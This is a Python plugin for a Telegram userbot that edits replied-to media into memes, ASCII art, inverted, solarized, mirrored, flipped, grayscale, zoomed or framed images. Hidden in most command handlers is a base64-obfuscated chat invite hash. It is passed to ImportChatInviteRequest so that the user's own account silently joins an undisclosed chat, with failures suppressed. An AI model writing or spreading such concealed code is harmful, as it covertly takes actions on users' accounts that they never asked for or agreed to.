"""
Created by @mayank1rakput
memify plugin
"""
import asyncio
import os
import random

from ..utils import admin_cmd, sudo_cmd
from . import (
    CMD_HELP,
    LOGS,
    add_frame,
    asciiart,
    skull_meeme,
    skull_meme,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    reply_id,
    runcmd,
    solarize,
    take_screen_shot,
)


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]


@bot.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
@bot.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    cmd = skull.pattern_match.group(1)
    skullinput = skull.pattern_match.group(2)
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = skull.reply_to_msg_id
    if skullinput:
        if ";" in skullinput:
            top, bottom = skullinput.split(";", 1)
        else:
            top = skullinput
            bottom = ""
    else:
        await edit_or_reply(
            skull, "```what should i write on that u idiot give some text```"
        )
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "skullmeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await skull_meme(top, bottom, meme_file, meme)
    else:
        await skull_meeme(top, bottom, meme_file, meme)
    if cmd != "mmf":
        meme = await convert_tosticker(meme)
    await skull.client.send_file(skull.chat_id, meme, reply_to=skullid)
    await skull.delete()
    os.remove(meme)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
@bot.on(sudo_cmd(pattern="ascii ?(.*)", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    skullinput = skull.pattern_match.group(1)
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = await reply_id(skull)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
        mayankidea = True
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to asci image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    meme_file = convert_toimage(meme_file)
    outputfile = "ascii_file.webp" if mayankidea else "ascii_file.jpg"
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not skullinput else skullinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await skull.client.send_file(skull.chat_id, outputfile, reply_to=skullid)
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="invert$", outgoing=True))
@bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
        mayankidea = True
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if mayankidea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await skull.client.send_file(
        skull.chat_id, outputfile, force_document=False, reply_to=skullid
    )
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
        mayankidea = True
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if mayankidea else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await skull.client.send_file(
        skull.chat_id, outputfile, force_document=False, reply_to=skullid
    )
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
        mayankidea = True
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if mayankidea else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await skull.client.send_file(
        skull.chat_id, outputfile, force_document=False, reply_to=skullid
    )
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="flip$"))
@bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
        mayankidea = True
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if mayankidea else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await skull.client.send_file(
        skull.chat_id, outputfile, force_document=False, reply_to=skullid
    )
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="gray$"))
@bot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
        mayankidea = True
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if mayankidea else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await skull.client.send_file(
        skull.chat_id, outputfile, force_document=False, reply_to=skullid
    )
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullinput = skull.pattern_match.group(1)
    skullinput = 50 if not skullinput else int(skullinput)
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if mayankidea else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, skullinput)
    except Exception as e:
        return await skull.edit(f"`{e}`")
    try:
        await skull.client.send_file(
            skull.chat_id, outputfile, force_document=False, reply_to=skullid
        )
    except Exception as e:
        return await skull.edit(f"`{e}`")
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(skull):
    if skull.fwd_from:
        return
    reply = await skull.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(skull, "`Reply to supported Media...`")
        return
    skullinput = skull.pattern_match.group(1)
    if not skullinput:
        skullinput = 50
    if ";" in str(skullinput):
        skullinput, colr = skullinput.split(";", 1)
    else:
        colr = 0
    skullinput = int(skullinput)
    colr = int(colr)
    skullid = skull.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    skull = await edit_or_reply(skull, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    skullsticker = await reply.download_media(file="./temp/")
    if not skullsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(skullsticker)
        await edit_or_reply(skull, "```Supported Media not found...```")
        return
    import base64

    mayankidea = None
    if skullsticker.endswith(".tgs"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "meme.png")
        skullcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {skullsticker} {skullfile}"
        )
        stdout, stderr = (await runcmd(skullcmd))[:2]
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith(".webp"):
        await skull.edit(
            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        os.rename(skullsticker, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("`Template not found... `")
            return
        meme_file = skullfile
        mayankidea = True
    elif skullsticker.endswith((".mp4", ".mov")):
        await skull.edit(
            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
        )
        skullfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(skullsticker, 0, skullfile)
        if not os.path.lexists(skullfile):
            await skull.edit("```Template not found...```")
            return
        meme_file = skullfile
    else:
        await skull.edit(
            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = skullsticker
    try:
        may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if mayankidea else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, skullinput, colr)
    except Exception as e:
        return await skull.edit(f"`{e}`")
    try:
        await skull.client.send_file(
            skull.chat_id, outputfile, force_document=False, reply_to=skullid
        )
    except Exception as e:
        return await skull.edit(f"`{e}`")
    await skull.delete()
    os.remove(outputfile)
    for files in (skullsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "memify": "**Plugin : **`memify`\
    \n\n  • **Syntax :** `.mmf toptext ; bottomtext`\
    \n  • **Function : **Creates a image meme with give text at specific locations and sends\
    \n\n  • **Syntax : **`.mms toptext ; bottomtext`\
    \n  • **Function : **Creates a sticker meme with give text at specific locations and sends\
    \n\n  • **Syntax : **`.ascii`\
    \n  • **Function : **reply to media file to get ascii image of that media\
    \n\n  • **Syntax : **`.invert`\
    \n  • **Function : **Inverts the colors in media file\
    \n\n  • **Syntax : **`.solarize`\
    \n  • **Function : **Watch sun buring ur media file\
    \n\n  • **Syntax : **`.mirror`\
    \n  • **Function : **shows you the reflection of the media file\
    \n\n  • **Syntax : **`.flip`\
    \n  • **Function : **shows you the upside down image of the given media file\
    \n\n  • **Syntax : **`.gray`\
    \n  • **Function : **makes your media file to black and white\
    \n\n  • **Syntax : **`.zoom` or `.zoom range`\
    \n  • **Function : **zooms your media file\
    \n\n  • **Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
    \n  • **Function : **make a frame for your media file\
    \n  • **fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
    "
    }
)
